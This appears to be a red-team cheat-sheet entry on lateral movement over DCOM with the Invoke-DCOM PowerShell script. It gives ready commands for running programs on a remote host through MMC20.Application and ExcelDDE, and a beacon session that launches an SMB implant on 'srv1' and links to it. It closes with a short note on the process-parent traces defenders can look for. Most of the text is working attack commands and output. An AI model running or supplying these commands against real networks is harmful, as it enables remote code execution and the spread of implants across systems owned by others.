# Invoke-DCOM

## [[DCOM]]
```
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command "calc.exe"
Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart "MyService"
```

To interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].
``````beacon
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
Completed

beacon> link srv1
[+] established link to child beacon: 10.10.1.20
``````

DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of `MMC20.Application`, the spawned process will be a child of `mmc.exe`.

``````
ProcessId: 952
Image: C:\Windows\beacon-smb.exe
ParentImage: C:\Windows\System32\mmc.exe
``````  
Processes started via DCOM may also be seen where the parent is `svchost.exe` (started with the command line `-k DcomLaunch`).

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
description: Lateral Move via DCOM
```